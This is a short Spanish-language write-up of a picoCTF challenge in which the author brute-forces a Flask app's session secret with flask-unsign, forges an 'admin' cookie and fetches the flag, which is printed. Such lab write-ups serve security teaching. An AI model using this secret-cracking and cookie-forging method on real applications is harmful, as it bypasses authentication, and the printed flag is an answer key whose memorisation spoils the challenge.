# Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:58076/
# Solución
```
┌──(.venv)─(daniel㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aa44gw.fwoKKvGHT2oIfOJEuSiO_dxFhe0" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29 attempts
'lebkuchen'

┌──(.venv)─(daniel㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "lebkuchen"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aa462Q.QYgRBlUjcOR1ocgzzFyq1vbs5og

┌──(.venv)─(daniel㉿kali)-[~]
└─$ curl -s http://wily-courier.picoctf.net:56963/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aa462Q.QYgRBlUjcOR1ocgzzFyq1vbs5og" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_b8a89e75}</code></p>
            
```

# Notas adicionales
Se necesita flask-unsign para crear la cookie.

# Referencias